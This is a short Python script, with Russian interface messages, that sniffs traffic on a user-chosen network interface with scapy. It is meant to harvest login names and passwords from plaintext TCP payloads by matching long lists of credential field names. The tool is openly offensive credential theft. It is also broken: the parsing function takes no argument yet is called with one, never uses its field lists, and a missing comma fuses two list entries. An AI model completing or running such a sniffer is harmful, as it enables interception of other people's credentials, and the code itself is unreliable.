import netifaces
from termcolor import colored
from scapy.all import *

# список доступных сетевых интерфейсов
interfaces = netifaces.interfaces()
# список интерфейсов для выбора пользователем
print(colored("Доступные интерфейсы:", 'green'))
for interface in interfaces:
    print(colored("- {}".format(interface), 'light_green'))
ifaces = input(colored("Введите желаемый интерфейс: ", 'blue'))
if ifaces not in interfaces:
    print(colored("Ошибка: интерфейс {} не найден".format(ifaces), 'red'))
    exit()

def get_login_pass():
    user = None
    passwd = None
    userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        get_login_pass(body)

try:
    sniff(iface=ifaces, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print(colored("exit", 'red'))
    exit(0)